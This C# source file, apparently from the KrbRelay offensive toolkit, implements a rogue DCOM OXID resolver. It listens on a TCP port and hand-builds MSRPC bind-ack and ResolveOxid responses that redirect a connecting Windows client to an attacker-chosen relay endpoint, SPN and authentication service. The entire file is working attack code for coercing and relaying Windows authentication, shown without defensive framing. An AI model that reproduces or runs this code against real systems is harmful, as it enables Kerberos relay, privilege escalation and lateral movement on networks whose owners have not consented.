using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace KrbRelay
{
    public static class RogueOxidResolver
    {
        static readonly byte[] NdrSyntax = new Guid("8a885d04-1ceb-11c9-9fe8-08002b104860").ToByteArray();
        static readonly byte[] BtfnPrefix = { 0x2c, 0x1c, 0xb7, 0x6c, 0x12, 0x98, 0x40, 0x45 };

        static string retIp;
        static int retPort;
        static string spn;
        static ushort svc;

        public static void Start(int port, string ip, int relayPort, string targetSpn, ushort authSvc)
        {
            retIp = ip; retPort = relayPort; spn = targetSpn ?? ""; svc = authSvc;

            var l = new TcpListener(IPAddress.Any, port);
            l.Start();
            Console.WriteLine("[*] rogue oxid: {0}:{1} -> 127.0.0.1[{2}] svc=0x{3:x} spn={4}",
                IPAddress.Any, port, relayPort, authSvc, spn);

            new Thread(() => {
                while (true)
                {
                    var c = l.AcceptTcpClient();
                    new Thread(() => Serve(c)) { IsBackground = true }.Start();
                }
            }) { IsBackground = true }.Start();
        }

        static void Serve(TcpClient c)
        {
            string peer = c.Client.RemoteEndPoint.ToString();
            Console.WriteLine("[*] rogue oxid: conn from {0}", peer);
            try
            {
                var s = c.GetStream();
                while (true)
                {
                    byte[] pkt = ReadPdu(s);
                    if (pkt == null) break;

                    byte[] resp = null;
                    switch (pkt[2])
                    {
                        case 0x0B: resp = BindAck(pkt); break;
                        case 0x00: resp = Request(pkt); break;
                        default:   resp = Fault(pkt, 0x1c010002); break;
                    }
                    s.Write(resp, 0, resp.Length);
                }
            }
            catch (Exception e) { Console.WriteLine("[!] rogue oxid: {0}", e.Message); }
            finally { c.Close(); }
        }

        static byte[] ReadPdu(NetworkStream s)
        {
            byte[] h = new byte[16];
            if (!Read(s, h, 16)) return null;
            ushort len = BitConverter.ToUInt16(h, 8);
            byte[] p = new byte[len];
            Buffer.BlockCopy(h, 0, p, 0, 16);
            if (len > 16 && !Read(s, p, 16, len - 16)) return null;
            return p;
        }

        static bool Read(NetworkStream s, byte[] b, int n) => Read(s, b, 0, n);
        static bool Read(NetworkStream s, byte[] b, int off, int n)
        {
            int r = 0;
            while (r < n)
            {
                int x = s.Read(b, off + r, n - r);
                if (x <= 0) return false;
                r += x;
            }
            return true;
        }

        static byte[] BindAck(byte[] bind)
        {
            ushort maxX = BitConverter.ToUInt16(bind, 16);
            ushort maxR = BitConverter.ToUInt16(bind, 18);
            byte n = bind[24];

            var m = new MemoryStream();
            var w = new BinaryWriter(m);
            w.Write(new byte[16]);
            w.Write(maxX); w.Write(maxR);
            w.Write((uint)0x12345678);

            byte[] sec = Encoding.ASCII.GetBytes("135\0");
            w.Write((ushort)sec.Length);
            w.Write(sec);
            while ((m.Position & 3) != 0) w.Write((byte)0);

            w.Write(n);
            w.Write(new byte[3]);

            int off = 28;
            for (int i = 0; i < n; i++)
            {
                byte ns = bind[off + 2];
                int ts = off + 24;
                if (Match(bind, ts, NdrSyntax))
                {
                    w.Write((ushort)0); w.Write((ushort)0);
                    w.Write(NdrSyntax); w.Write((uint)2);
                }
                else if (Prefix(bind, ts, BtfnPrefix))
                {
                    byte[] u = new byte[16];
                    Buffer.BlockCopy(bind, ts, u, 0, 16);
                    w.Write((ushort)3); w.Write((ushort)0);
                    w.Write(u); w.Write((uint)1);
                }
                else
                {
                    w.Write((ushort)2); w.Write((ushort)2);
                    w.Write(new byte[20]);
                }
                off += 4 + 20 + (ns * 20);
            }

            byte[] r = m.ToArray();
            FillHdr(r, 0x0C, bind);
            return r;
        }

        static byte[] Request(byte[] req)
        {
            ushort cid = BitConverter.ToUInt16(req, 20);
            ushort op  = BitConverter.ToUInt16(req, 22);
            byte[] stub;
            switch (op)
            {
                case 0: case 4: stub = ResolveOxidStub(); break;
                case 3: case 5: stub = ServerAliveStub(); break;
                case 1: case 2: stub = BitConverter.GetBytes((uint)0); break;
                default: return Fault(req, 0x1c010003);
            }
            return Response(req, cid, stub);
        }

        static byte[] ResolveOxidStub()
        {
            string ep = string.Format("{0}[{1}]", retIp, retPort);
            int el = ep.Length + 1;
            int sl = spn.Length + 1;
            int so = (1 + el) + 1;
            int total = so + 2 + sl + 1;

            ushort[] a = new ushort[total];
            a[0] = 0x07;
            for (int i = 0; i < ep.Length; i++) a[1 + i] = ep[i];
            a[so] = svc;
            a[so + 1] = 0xFFFF;
            for (int i = 0; i < spn.Length; i++) a[so + 2 + i] = spn[i];

            var m = new MemoryStream();
            var w = new BinaryWriter(m);
            w.Write((uint)0x00020000);
            w.Write((uint)total);
            w.Write((ushort)total);
            w.Write((ushort)so);
            for (int i = 0; i < total; i++) w.Write(a[i]);
            while ((m.Position & 3) != 0) w.Write((byte)0);

            w.Write(new Guid("11111111-2222-3333-4444-555555555555").ToByteArray());
            w.Write((uint)2);
            w.Write((ushort)5); w.Write((ushort)7);
            w.Write((uint)0);
            return m.ToArray();
        }

        static byte[] ServerAliveStub()
        {
            var m = new MemoryStream();
            var w = new BinaryWriter(m);
            w.Write((ushort)5); w.Write((ushort)7);
            w.Write(new byte[4]);
            w.Write((uint)0x00020000);
            w.Write((uint)1);
            w.Write((ushort)1); w.Write((ushort)0);
            w.Write((ushort)0);
            while ((m.Position & 3) != 0) w.Write((byte)0);
            w.Write((uint)0); w.Write((uint)0);
            return m.ToArray();
        }

        static byte[] Response(byte[] req, ushort cid, byte[] stub)
        {
            var m = new MemoryStream();
            var w = new BinaryWriter(m);
            w.Write(new byte[16]);
            w.Write((uint)stub.Length);
            w.Write(cid);
            w.Write((byte)0); w.Write((byte)0);
            w.Write(stub);
            byte[] r = m.ToArray();
            FillHdr(r, 0x02, req);
            return r;
        }

        static byte[] Fault(byte[] req, uint code)
        {
            var m = new MemoryStream();
            var w = new BinaryWriter(m);
            w.Write(new byte[16]);
            w.Write((uint)0); w.Write((ushort)0);
            w.Write((byte)0); w.Write((byte)0);
            w.Write(code); w.Write((uint)0);
            byte[] r = m.ToArray();
            FillHdr(r, 0x03, req);
            return r;
        }

        static void FillHdr(byte[] p, byte type, byte[] src)
        {
            p[0] = 0x05; p[1] = 0x00;
            p[2] = type; p[3] = 0x03;
            p[4] = 0x10;
            p[8] = (byte)p.Length;
            p[9] = (byte)(p.Length >> 8);
            Buffer.BlockCopy(src, 12, p, 12, 4);
        }

        static bool Match(byte[] b, int o, byte[] u)
        {
            if (o + 16 > b.Length) return false;
            for (int i = 0; i < 16; i++) if (b[o + i] != u[i]) return false;
            return true;
        }

        static bool Prefix(byte[] b, int o, byte[] p)
        {
            if (o + p.Length > b.Length) return false;
            for (int i = 0; i < p.Length; i++) if (b[o + i] != p[i]) return false;
            return true;
        }
    }
}
